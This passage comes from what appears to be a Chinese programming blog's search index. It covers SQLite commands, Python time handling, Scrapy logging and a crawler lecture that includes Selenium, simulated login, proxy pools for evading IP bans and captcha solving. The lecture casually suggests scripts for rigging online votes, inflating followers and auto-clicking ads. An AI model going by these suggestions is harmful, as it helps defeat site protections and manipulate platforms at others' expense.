展示系统<br>桌面应用<br>web服务</p><p>。<br>第三步，重要站点的录入、监控、自动成报。暗网中包含众多信息，将其归为12类，我们主要关注前五类数据信息（技术类、商业类、核心网站类、社会类、政治与宗教类），并每日进行更新爬取，形成监控并能够自动成报。<br>1.技术类：分享技术/出售黑客技术/售卖0day/漏洞利用<br>2.商业类：其中包括交易市场,自营商店,第三方托管平台(网站担保);交易品种大多是信用卡、枪支、毒品、护照、电子产品、伪钞、解密服务、杀手服务、比特币洗钱服务等;大多数网站使用比特币进行交易。我们重点关注网络安全方面的商品。<br>3.核心网站：包括暗网搜索引擎,暗网链接目录等<br>4.社会类：包括论坛,暗网维基等。<br>5.政治与宗教类：包括暗网的新闻媒体机构,全球维基解密,政党丑闻,激进主义言论,传教等。<br>6.个人类：包括个人博客,页面,书籍等。<br>7.通讯类：包括聊天室,邮件服务,暗网邮箱<br>8.主机托管类：主要为暗网服务托管商的宣传站,介绍其机器性能与架构。<br>9.其他语言类<br>10.成人类<br>11.赌博类(网络赌场等)<br>12.其他类(艺术,音乐,需登陆的,无内容,被查封的,视频等)</p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlite3使用</title>
      <link href="2020/06/16/2020-06-16-sqlite3/"/>
      <url>2020/06/16/2020-06-16-sqlite3/</url>
      
        <content type="html"><![CDATA[<p>sqlite数据库只用一个文件就ok，小巧方便，所以是一个非常不错的嵌入式数据库，SQLite大量的被用于手机，PDA，MP3播放器以及机顶盒设备。</p><pre><code>Mozilla Firefox使用SQLite作为数据库。Mac计算机中的包含了多份SQLite的拷贝，用于不同的应用。PHP将SQLite作为内置的数据库。Skype客户端软件在内部使用SQLite。SymbianOS(智能手机操作平台的领航)内置SQLite。AOL邮件客户端绑定了SQLite。Solaris 10在启动过程中需要使用SQLite。McAfee杀毒软件使用SQLite。iPhones使用SQLite。Symbian和Apple以外的很多手机生产厂商使用SQLite。</code></pre><p>下面就sqlite中的常用命令和语法介绍</p><p>sqlite中命令以.开头,大小写敏感（数据库对象名称是大小写不敏感的）</p><p>创建数据库</p><pre><code>sqlite3 testDB.db.open testDB.db</code></pre><p>一些常用命令</p><pre><code>.exit 退出.help 查看帮助 针对命令.database 显示数据库信息；包含当前数据库的位置.tables 或者 .table 显示表名称  没有表则不显示.schema 命令可以查看创建数据对象时的SQL命令；.schema databaseobjectname 查看创建该数据库对象时的SQL的命令；如果没有这个数据库对象就不显示内容，不会有错误提示.read FILENAME 执行指定文件中的SQL语句</code></pre><p>查看表结构<br>select * from sqlite_master where type=”table”;</p><p>查看某张表结构<br>select * from sqlite_master where type=”table” and name=”emperors”;</p><p>导出到csv</p><p>sqlite3 -header -csv gz17zwd.db “select * from shop;” &gt; gz17zwd.csv</p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqlite </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python中时间获取及格式转换</title>
      <link href="2020/06/16/2020-06-16-python_time/"/>
      <url>2020/06/16/2020-06-16-python_time/</url>
      
        <content type="html"><![CDATA[<p>python时间格式、转换函数总是记不住，利用点时间将个人常用的一些获取转换方式记录下来。</p><p>Python 程序能用很多方式处理日期和时间，转换日期格式是一个常见的功能。主要有time,datatime,calendar,python-dateutil模块</p><p>python中时间日期格式化符号:</p><pre><code>%y 两位数的年份表示（00-99）%Y 四位数的年份表示（000-9999）%m 月份（01-12）%d 月内中的一天（0-31）%H 24小时制小时数（0-23）%I 12小时制小时数（01-12）%M 分钟数（00=59）%S 秒（00-59）%a 本地简化星期名称%A 本地完整星期名称%b 本地简化的月份名称%B 本地完整的月份名称%c 本地相应的日期表示和时间表示%j 年内的一天（001-366）%p 本地A.M.或P.M.的等价符%U 一年中的星期数（00-53）星期天为星期的开始%w 星期（0-6），星期天为星期的开始%W 一年中的星期数（00-53）星期一为星期的开始%x 本地相应的日期表示%X 本地相应的时间表示%Z 当前时区的名称%% %号本身</code></pre><h2 id="time模块"><a href="#time模块" class="headerlink" title="time模块"></a>time模块</h2><p>1.当前时间-时间戳</p><pre><code>#!/usr/bin/python# -*- coding: UTF-8 -*-import time;  # 引入time模块ticks = time.time()print &quot;当前时间戳为:&quot;, ticks</code></pre><p>运行结果：</p><pre><code>当前时间戳为: 1459994552.51</code></pre><p>2.获取当前时间</p><pre><code>#!/usr/bin/python# -*- coding: UTF-8 -*-import timelocaltime = time.localtime(time.time())print &quot;本地时间为 :&quot;, localtime</code></pre><p>运行结果：</p><pre><code>本地时间为 : time.struct_time(tm_year=2016, tm_mon=4, tm_mday=7, tm_hour=10, tm_min=3, tm_sec=27, tm_wday=3, tm_yday=98, tm_isdst=0)</code></pre><p>3.格式化当前时间</p><pre><code>#!/usr/bin/python# -*- coding: UTF-8 -*-import timelocaltime = time.asctime( time.localtime(time.time()) )print &quot;本地时间为 :&quot;, localtime</code></pre><p>运行结果：</p><pre><code>本地时间为 : Thu Apr  7 10:05:21 2016</code></pre><p>4.格式化当前日期</p><pre><code>#!/usr/bin/python# -*- coding: UTF-8 -*-import time# 格式化成2016-03-20 11:45:39形式print time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, time.localtime()) # 格式化成Sat Mar 28 22:24:24 2016形式print time.strftime(&quot;%a %b %d %H:%M:%S %Y&quot;, time.localtime()) # 将格式字符串转换为时间戳a = &quot;Sat Mar 28 22:24:24 2016&quot;print time.mktime(time.strptime(a,&quot;%a %b %d %H:%M:%S %Y&quot;))</code></pre><p>运行结果：</p><pre><code>2016-04-07 10:25:09Thu Apr 07 10:25:09 20161459175064.0</code></pre><h2 id="calendar模块"><a href="#calendar模块" class="headerlink" title="calendar模块"></a>calendar模块</h2><p>获取某月日历</p><pre><code>#!/usr/bin/python# -*- coding: UTF-8 -*-import calendarcal = calendar.month(2017, 12)print &quot;以下输出2017年12月份的日历:&quot;print cal;</code></pre><p>运行结果：</p><pre><code>以下输出2017年12月份的日历:December 2017Mo Tu We Th Fr Sa Su            1  2  34  5  6  7  8  9 1011 12 13 14 15 16 1718 19 20 21 22 23 2425 26 27 28 29 30 31</code></pre><h2 id="datetime模块"><a href="#datetime模块" class="headerlink" title="datetime模块"></a>datetime模块</h2><p>1.日期输出格式化</p><pre><code># datetime =&gt; string# 输出为&#39;2020-06-16 08:55:04&#39;now = datetime.datetime.now()now.strftime(&#39;%Y-%m-%d %H:%M:%S&#39;)# string =&gt; datetime# 输出为datetime.datetime(2020, 3, 5, 16, 26, 23)t_str = &#39;2020-03-05 16:26:23&#39;d = datetime.datetime.strptime(t_str, &#39;%Y-%m-%d %H:%M:%S&#39;)</code></pre><ol start="2"><li>日期比较操作</li></ol><p>在datetime模块中有timedelta类，这个类的对象用于表示一个时间间隔，比如两个日期或者时间的差别。</p><p>构造方法：</p><pre><code>datetime.timedelta(days=0, seconds=0, microseconds=0, milliseconds=0, minutes=0, hours=0, weeks=0)</code></pre><p>所有的参数都有默认值0，这些参数可以是int或float，正的或负的。</p><p>可以通过timedelta.days、tiemdelta.seconds等获取相应的时间值。</p><pre><code># 两个日期相差多少天# 输出为3d1 = datetime.datetime.strptime(&#39;2020-03-05 17:41:20&#39;, &#39;%Y-%m-%d %H:%M:%S&#39;)d2 = datetime.datetime.strptime(&#39;2020-03-02 17:41:20&#39;, &#39;%Y-%m-%d %H:%M:%S&#39;)delta = d1 - d2print(delta.days)# 今天的n天后的日期now = datetime.datetime.now()delta = datetime.timedelta(days=3)n_days = now + deltaprint(n_days.strftime(&#39;%Y-%m-%d %H:%M:%S&#39;))# 但用上述办法分情况加30天或者31天得到下个月日期，碰到2月份还要考虑是28天还是闰年的29天，判断起来很麻烦而且还没有办法100%得到想要的数据。# 于是就有了python-dateutil模块# relativedelta函数，参数特别多，功能很强大，完美解决了获取正确日期的问from dateutil.relativedelta import relativedeltasdate  = datetime.datetime.strptime(&#39;2020.01.05&#39;,&#39;%Y.%m.%d&#39;)edate  = sdate + relativedelta(months=1)print(edate)</code></pre>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>清除scrapy爬虫满屏的打印信息的问题 </title>
      <link href="2020/06/13/2020-06-13-Scrapy_log_level/"/>
      <url>2020/06/13/2020-06-13-Scrapy_log_level/</url>
      
        <content type="html"><![CDATA[<p>清除scrapy爬虫满屏的打印信息的问题 </p><p>Scrapy 提供了 log 功能。可以通过 scrapy.log 模块使用。</p><p>在运行scrapy crawl aimks时，屏幕上满屏的打印信息，实在是不好找错误信息。</p><p>我查了下scrapy的log服务，他默认开启的是debug模式。</p><p>log 服务必须通过显式调用 scrapy.log.start() 来开启，以捕捉顶层的 Scrapy 日志消息。</p><p>再次之上，每个 crawler 都拥有独立的 log 观察者（observer）（创建时自动连接（attach）），接收其 spider 的日志消息。</p><p>Scrapy 提供 5 层 logging 级别：</p><pre><code>CRITICAL – 严重错误(critical)ERROR – 一般错误(regular errors)WARNING – 警告信息(warning messages)INFO – 一般信息(informational messages)DEBUG – 调试信息(debugging messages)</code></pre><p>Logging 设置</p><p>以下设置可以被用来配置 logging：</p><pre><code>LOG_ENABLEDLOG_ENCODINGLOG_FILELOG_LEVELLOG_STDOUT</code></pre><p>在setting中设置</p><pre><code>LOG_LEVEL= &#39;WARNING&#39;</code></pre><p>就清爽了很多.</p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> scrapy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>爬虫技术经验分享讲稿</title>
      <link href="2020/06/09/2020-06-09-spiders_lecture/"/>
      <url>2020/06/09/2020-06-09-spiders_lecture/</url>
      
        <content type="html"><![CDATA[<p>今天主要分享的就是我最近项目中使用的爬虫技术，</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/spiders_lecture_0.jpg"></p><p>是这样的爬虫吗？</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/spiders_lecture_1.png"></p><p>不是。应该是这样的爬虫。</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/spiders_lecture_2.png"></p><p>鲁迅曾经说过互联网中有超过50%的流量来自爬虫，那我们今天就来了解下</p><ol><li><p>生活中的爬虫</p></li><li><p>爬虫定义、用途</p></li><li><p>爬虫原理</p></li><li><p>爬虫进阶</p></li><li><p>爬虫法律问题</p></li><li><p>爬虫前景</p></li></ol><h1 id="一、前言-生活上的爬虫"><a href="#一、前言-生活上的爬虫" class="headerlink" title="一、前言:生活上的爬虫"></a>一、前言:生活上的爬虫</h1><p>先问一个问题，大家都用过爬虫么？====其实大家都用过。</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/spiders_lecture_24.jpg"></p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/spiders_lecture_25.png"></p><p>我们每天使用的百度谷歌，其实就是利用了这种爬虫技术：每天放出无数爬虫到各个网站，把他们的信息抓回来，然后供我们来检索。Google的爬虫叫做Googlebot，百度的爬虫叫做Baiduspider。</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/spiders_lecture_3.png"></p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/spiders_lecture_14.png"></p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/spiders_lecture_56.png"></p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/spiders_lecture_55.png"></p><p>再比如，每次节假日出行，我们需要用抢票软件抢票，智行火车票、去哪儿app，这些都利用了爬虫技术。帮助你不断刷新12306网站的火车余票，开通会员、购买加速包都能提升爬取速度。一旦发现有票，就马上拍下来，然后让你付款。</p><p>其实我们的手机APP上布满了网络爬虫。</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/spiders_lecture_27.jpg"></p><p>各行各业被会被爬取数据，身后都是一条真实而强大的利益链条。</p><p>比如说出行行业：出行行业中爬虫的占比最高（20.87%）。在出行的爬虫中，有90%的流量都是冲着12306去的。这不意外，全中国卖火车票的独此一家别无分号。你还记得当年12306上线王珞丹和白百何的“史上最坑图片验证码”么？</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/spiders_lecture_53.png"></p><p>这些东西不是为了故意难为老老实实买票的人的，而恰恰是为了阻止爬虫（也就是抢票软件）的点击。爬虫只会简单的机械点击，它不认识白百何，所以很大一部分爬虫就被挡在了门外。但是抢票软件也不是吃素的，它们联合一种东西叫做“打码平台”，雇佣了很多大爷大妈，他们在电脑屏幕前不做别的事情，专门帮人识别验证码。那边抢票软件遇到了验证码，系统就会自动把这些验证码传到大爷大妈面前，他们手工选好哪个是白百何哪个是王珞丹，然后再把结果传回去。总共的过程用不了几秒时间。打码平台还有记忆功能，如果大爷大妈已经标记了这张图是“白百合”，那么下次这张图片再出现的时候，系统就直接判断它是“白百合”。时间一长，12306系统里的图片就被标记完了，机器自己都能认识，大爷大妈都可以坐在一边斗地主了。</p><p>再比如社交行业的爬虫重灾区，就是微博。</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/spiders_lecture_28.jpg"></p><p>上图这些都是微博接口API，可以用来获取某个人的微博列表、微博的状态、索引等等等等。那么用这些可以做什么呢？微博没人关注，可以用大量的爬虫，刷粉丝；有了粉丝，可以找厂商投广告，点击、注册广告就可以获得流量费，可以用爬虫自动去完成点击、注册动作；微博大V们经常发红包，爬虫也可以去抢。</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/spiders_lecture_29.jpg"></p><p>再来看看电商行业，有种东西叫比价平台、聚合电商、或者返利平台。比如“什么值得买”APP。你搜索一样商品，这类聚合平台就会自动把各个电商的商品都放在你面前供你选择。有淘宝、京东，还有唯品会苏宁易购。这个原理和谷歌差不多。只不过他们展示的不是网页而是商品。</p><p>所以我们的生活中其实处处都充满了爬虫。</p><h1 id="二、爬虫定义、用途"><a href="#二、爬虫定义、用途" class="headerlink" title="二、爬虫定义、用途"></a>二、爬虫定义、用途</h1><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/spiders_lecture_5.jpg"></p><p>爬虫的定义是什么？</p><p>爬虫就是获取互联网公开数据的自动化工具。需要指出的是，公开数据，就是网站上公开让用户浏览、获取的数据，而不是通过特殊技术入侵到网站服务器获取的非公开数据。</p><p>简单来说，从某些网站提取出我们感兴趣、有价值的内容，可以是图片、文本，也可以是音乐、视频，但是我们不可能去每一个网页去点去看，然后再复制粘贴保存。所以我们需要一种能自动获取网页内容并可以按照指定规则提取相应内容的程序，这就是爬虫技术。</p><p>使用爬虫代替人工，减少人工处理的代价。</p><p>那对于我们而言，可以用爬虫做什么呢？</p><p>1.批量下载保存（小说、音乐、视频、图片）。这也是爬虫最基础的用途。</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/spiders_lecture_26.jpg"><br><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/spiders_lecture_6.jpg"><br><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/spiders_lecture_152.jpg"><br><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/spiders_lecture_151.jpg"></p><p>2.商品秒杀、抢优惠券、活动脚本。今年618年中大促，淘宝618的理想列车领瞄币脚本、京东618叠蛋糕自动刷任务，都可以通过爬虫技术实现自动化,github上都有人给了脚本，有兴趣大家可可以试一试，看看能省几个钱。</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/spiders_lecture_9.jpg"><br><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/spiders_lecture_10.jpg"><br><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/spiders_lecture_11.jpg"><br><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/spiders_lecture_12.jpg"></p><p>3.抢票。可以写自动化的脚本去抢火车票、机票、演唱会门票等等。</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/spiders_lecture_13.jpg"></p><p>4.投票。可以利用爬虫编写网络自动投票器，程序员的小孩每个都是学校的最美萌娃。当然这里面会有ip限制等等具体实现细节。</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/spiders_lecture_14.jpg"></p><p>5.信息聚合。简单来说就是抓取分散在各个角落的信息，整合后用网站、APP等呈现出来，减少了用户查询的时间。今日头条就是典型的新闻聚合app。比如说我们关心网络安全新闻，就可以聚合各大安全公司安全资讯、漏洞信息。又比如，如果比较关心基金，可以爬取各大财富密码的基金信息和每日净值。</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/spiders_lecture_15.jpg"><br><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/spiders_lecture_16.jpg"></p><p>6.数据获取。各行各业都需要数据分析，数据分析的第一步就是数据获取。比如获得各个机场的实时流量、获得热点城市的火车票情况、各种热门公司招聘中的职位数及月薪分布、某公司的门店变化情况等等信息获取，之后做数据分析处理、机器学习、数据预测等等。</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/spiders_lecture_17.jpg"></p><h1 id="三、爬虫原理"><a href="#三、爬虫原理" class="headerlink" title="三、爬虫原理"></a>三、爬虫原理</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>1.HTTP基本原理</p><ul><li>HTTP和HTTPS</li><li>HTTP请求和响应过程</li></ul><p>2.网页基础 CSS HTML JS</p><ul><li>网页组成HTML, CSS 和JavaScrip</li><li>HTML DOM树</li><li>选择器</li></ul><p>3.浏览器开发者调试工具</p><ul><li>元素（ELements）</li><li>控制台（Console）</li><li>源代码（Sources）</li><li>网络（Network）</li></ul><h2 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h2><p>接下来我们来具体讲一下爬虫的基本流程</p><p>爬虫的基本流程就是发起请求——获取响应内容——解析内容——保存数据</p><p>我们来看一个简单爬虫。这是对虎扑NBA新闻的爬取例子。很简单，但麻雀虽小，五脏俱全。</p><pre><code>from lxml import etreeimport requestsdef hupu_nba():    # 发起请求    url = &#39;https://voice.hupu.com/nba&#39;    headers = &#123;        &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134&#39;,    &#125;    response = requests.get(url = url,headers = headers)    # 获取响应    content = response.text    # 解析内容    news = etree.HTML(content)    news_content = news.xpath(r&#39;//div[@class=&quot;news-list&quot;]/ul/li/div/h4/a/text()&#39;)    news_url = news.xpath(r&#39;//div[@class=&quot;news-list&quot;]/ul/li/div/h4/a/@href&#39;)    # 保存数据    for new in zip(news_content ,news_url):        print(new[0].strip(&#39; &#39;),new[1])if __name__ == &#39;__main__&#39;:    hupu_nba()</code></pre><p>结果：</p><pre><code>ESPN2023届高中生排行：DJ-瓦格纳榜首布朗尼第24 https://voice.hupu.com/nba/2590767.html普雷斯蒂谈复赛：我们拥有很棒的团队，让我们拭目以待吧 https://voice.hupu.com/nba/2590762.html瓦妮莎向直升机公司索赔数亿美元经济损失和其他赔偿 https://voice.hupu.com/nba/2590757.html比克斯塔夫：理解NBA复赛决策，但我们的球员真的很生气 https://voice.hupu.com/nba/2590751.html湖人助教霍林斯想参与复赛，高龄教练相信迪士尼很安全 https://voice.hupu.com/nba/2590743.html训练师：东契奇的体型不在最佳状态，他有足够时间恢复 https://voice.hupu.com/nba/2590718.html掘金助教：约基奇组织能力及对队友积极影响与詹姆斯类似 https://voice.hupu.com/nba/2590712.html勇士有意签回格伦-罗宾逊三世 https://voice.hupu.com/nba/2590701.html36年前的今天，绿军五人得分上双大胜湖人拿下天王山之战 https://voice.hupu.com/nba/2590699.html老当益壮！詹姆斯转发迈克-米勒和年轻球员单挑视频 https://voice.hupu.com/nba/2590690.html活塞向联盟提议让没有参加复赛的球队进行迷你夏季联赛 https://voice.hupu.com/nba/2590684.html默里：空场比赛会是很大的挑战，球迷是比赛的一部分 https://voice.hupu.com/nba/2590682.html</code></pre><p>1、发起请求 就是使用http库向目标站点发起请求</p><p>（1）常用的请求方式：GET，POST</p><p>get请求的参数直接放在url后：k1=xxx&amp;k2=yyy&amp;k3=zzz，常见的比如查询，像百度wd=。。。</p><p>post请求的参数放在请求体内:存放于form data表单中，常见的比如登陆，会将用户名密码填入表单</p><p>（2）头部信息</p><p>user-agent。比如，你需要得到手机版页面，就要设置浏览器身份标识为手机浏览器的user-agent。</p><p>携带cookie,使用代理proxy。</p><p>2、获取响应内容 如果服务器能正常响应，一般会得到一个网页，里面包含排版文字、图片、视频等数据，是一个丰富内容格式的页面，主要是文本格式的html代码。有时候也会返回json、图片、视频等。</p><p>常见响应状态码：</p><p>200：代表访问成功</p><p>301：代表跳转，重定向</p><p>403：请求的资源不允许访问，没有权限</p><p>404：请求的内容不存在</p><p>500：内部服务器错误，可能是暂时的，后面要再次请求试试</p><p>502：网关错误</p><p>503：服务不可用</p><p>获取网页主要使用urllib或requests库。</p><p>3、解析内容</p><p>解析html数据：正则表达式，第三方解析库如Beautifulsoup，lxml等。正文提取：github上有一些现成的库，例如Goose、GNE等，利用节点文本密度实现正文快速采集。</p><p>解析json数据：json模块</p><p>解析二进制数据:以b的方式写入文件</p><p>4、保存数据 </p><p>打印、写入文件（txt、JSON、CSV）、写入数据库(关系型mysql、非关系型mongodb redis)等等</p><p>以上只是一个简单爬虫，使用中，我们还会有各种各样的需求、遇到各式各样的问题。</p><h1 id="四、爬虫进阶"><a href="#四、爬虫进阶" class="headerlink" title="四、爬虫进阶"></a>四、爬虫进阶</h1><p>1.JS渲染页面</p><p>在抓取网页时，发现得到的源代码实际和浏览器中看到的不一样。这是一个非常常见的问题。现在网页越来越多地采用AJAX、前端模块化工具来构建，整个网页可能都是JavaScript渲染出来的，也就是说原始的HTML就是个空壳，我们看个例子</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;UTF-8&quot;&gt;&lt;title&gt;This is a Demo&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;div id=&quot;container&quot;&gt;&lt;/div&gt;&lt;/body&gt;&lt;script src=&quot;app.js&quot;&gt;&lt;/script&gt;&lt;/html&gt;</code></pre><p>body节点里面只有一个id为container的节点，但是需要注意在body节点后引入了app.js，它便负责整个网站的渲染。</p><p>在浏览器中打开这个页面时首先会加载这个html内容，接着浏览器会发现其中引入了app.js文件，然后便会接着去请求这个文件，获取到该文件后，便会执行其中的JS代码，而JS则会改变HTML中的节点，向其中添加内容，最后得到完整的页面。</p><p>但是我们用urllib或requests等库请求当前页面时，我们得到的只是这个HTML代码，它捕获帮助我们去继续加载这个JS文件，这样就看不到浏览器中的内容了。这也解释了为什么有时候我们得到的源代码和浏览器中看到的不一样。因此，使用基本的http请求库的得到的源代码可能跟浏览器中的页面源代码不太一样。对于这样的情况，我们可以分析其后台AJAX接口，也可以使用selenium、splash、PyV8这样的库，来实现模拟JS渲染。</p><p>（1）AJAX数据爬取</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/spiders_lecture3.png"></p><p>大家应该看到过很多查看更多、loadmore之类的网页，这些数据一般都是AJAX加载的。Ajax全称为Asynchronous JavaScript and XML,即异步的JS和XML，是利用JS在保证页面不被刷新、页面链接不改变的情况下与服务器交换数据并更新网页的技术。数据加载是一种异步加载的方式，原始的页面最初不会包含某些数据，原始页面加载完后，会再向服务器请求某个接口获取数据，然后数据才被处理从而呈现到网页上，这其实就是发送了一个AJAX请求。</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/spiders_lecture_153.jpg"></p><p>对于这样的网页，直接抓取原始页面，是无法获取有效的数据的。打开浏览器开发者工具，切换到Network选项卡。这里其实就是在页面加载过程中浏览器与服务器之间发送请求和接收响应的所有记录。Ajax有其特殊的请求类型，叫做xhr。查看Type为xhr的包，就可以找到AJAX请求。鼠标点击这个请求就可以看到这个请求的详细信息。点击一下Preview，可以看到响应的内容，一般是JSON格式的。JS接收到这些数据后，再执行相应的渲染方法，整个页面就渲染出来了。我们只用分析解析这个json数据，获取想要的内容即可。</p><p>实验：AJAX爬取今日头条街拍美图</p><p><a href="https://www.jianshu.com/p/5e6940cff596">https://www.jianshu.com/p/5e6940cff596</a></p><p>（2）使用Selenium库模拟JS渲染</p><p>JS动态渲染的页面不知AJAX这一种，比如中国青年网的分页部分是由JS生成的，并非原始HTML代码，这其中并不包含AJAX请求。比如Echarts，图形都是经过JS计算后生成的。再如淘宝即使有AJAX获取的数据，但他的接口含有很多加密参数，难以找出规律分析抓取。这种情况下，我们可以直接使用模拟浏览器运行的方式实现，不用去管网页内部的JS用了什么算法渲染页面，不用管网页后台的AJAX接口有哪些参数。</p><p>Selenium是一个自动化测试工具，利用它可以驱动浏览器执行特定的动作，如点击、下拉等操作，同时还可以获取浏览器当前呈现的源代码，做到所见即所爬。对于一些JS动态渲染的页面来说，此种抓取方式非常有效。需要安装好浏览器并配置好驱动，例如Chrome和其驱动ChromeDriver,Firefox和其驱动GeckoDriver。</p><p>瓜子二手车网站是一个js加密后的网站 <a href="https://www.guazi.com/cc/buy/o1r18/">https://www.guazi.com/cc/buy/o1r18/</a> </p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/spiders_lecture_154.jpg.png"></p><pre><code>from selenium import webdriverchrome = webdriver.Chrome()chrome.get(&#39;https://www.guazi.com/cc/buy/o1r18/&#39;)print(chrome.page_source)</code></pre><p>便获得了JS渲染后的源代码，从中再提取数据。</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/spiders_lecture_155.jpg"></p><p>实战：selenium+PhantomJS爬取瓜子二手车<br><a href="https://zhuanlan.zhihu.com/p/65436198">https://zhuanlan.zhihu.com/p/65436198</a></p><p>2.模拟登陆</p><p>很多情况下，页面的某些信息需要登陆后才能查看。我们就需要做一些模拟登陆的事情。简单来说，打开网页然后模拟登陆，这实际上是在客户端生成了Cookies，而Cookies里面保存了SessionID的信息，登陆之后的后续请求都会携带生成后的Cookies发给服务器。服务器就会根据Cookies判断出对应的SessionID，进而找到会话。如果当前会话是有效的，那么服务器就判断当前用户已经登陆了，返回请求的页面信息，那么我们就可以看到登陆之后的页面。</p><p>主要是分析登陆过程，需要探究后台的登陆请求是怎样发送的，登陆之后又有怎样的处理过程。对于我们要模拟登陆的网站，清除cookies，然后打开开发者工具，手动登陆。去观察发送的表单内容，一般是用户名、密码，也会包含其他内容，比如携带一些构造的token、隐藏表单元素，防止你模拟登陆，但我们可以探寻一下这些内容如何获取，理清表单生成方式后，即可模拟登陆。如果实在构造不出表单，还是可以利用selenium实现模拟登陆。</p><p>实战：模拟登录Github</p><p><a href="https://www.jianshu.com/p/84e35f7e8662">https://www.jianshu.com/p/84e35f7e8662</a></p><p>3.代理使用</p><p>某些网站服务器会检测某个IP在单位时间内的请求次数，如果超过了某个阈值，那么服务器就会直接拒绝服务，返回一些错误信息。这种情况我们的IP就被封了，我们需要借助代理的方式让服务器无法识别由我们本机发起的请求。</p><p>网上有很多免费代理，如西刺代理，但免费的大多都不好用，靠谱的还是购买付费代理。</p><p>获取代理后，爬取时设置代理即可。</p><p>urllib库需要借助ProxyHandler设置</p><p>requests库只需要传入proxies参数即可</p><p>但是代理不能保证一直是可用的。因为可能此IP被其他人使用爬同样的目标站点而被封禁，或者代理服务器突然发生故障或网络繁忙。一旦我们选用了一个不可用的代理，这势必会影响爬虫的工作效率。因此我们需要提前作筛选，剔除掉不可用代理，保留维护一个高效易用的代理池。代理池的架构和实现细节我就不赘述了，推荐一个github项目：<a href="https://github.com/jhao104/proxy_pool">Python爬虫代理IP池(proxy pool)</a>，该项目不定期更新，维护了大量的免费代理：无忧代理、66代理、西刺代理等等，也测评了很多付费代理。</p><p>4.验证码识别</p><p>验证码最初是几个数字组合的简单图形验证码，后来加入了英文字母和混淆曲线。之后又出现了滑动验证码、点触验证码、计算题验证码、微博宫格验证码等等。</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/spiders_lecture_1545.jpg"><br><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/spiders_lecture_1546.jpg"><br><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/spiders_lecture_1547.jpg"></p><p>不同的验证码有不同的解决方式。</p><p>(1)简单的图形验证码可以利用OCR识别，OCR是光学字符识别的缩写，用于在图像中提取文本信息，tesseract-ocr是利用该技术实现的一个验证码识别库，在Python中可以通过第三方库pytesseract直接调用它。但是复杂一点的，加入了英文字母和混淆曲线的，就需要采用一些别的方法。</p><p>(2)模板匹配。之前对暗网某市场的验证码进行过处理，正确率最后可以达到99.4%。</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/spiders_lecture_1548.jpg"></p><p>1.收集大量验证码</p><p>2.图片清理</p><p>对于有干扰的验证码，我们需要预先进行图片处理，比如灰度化、二值化（需尝试然后选取一个合适的阈值）、去除干扰线、去噪、清理干扰点等等。</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/spiders_lecture_1549.jpg"></p><p>3.图片标记<br>利用ocr对清洗过的图片进行大体的标记，其中不乏一些错误的，人工将错误的找出来并重新标记。</p><p><img 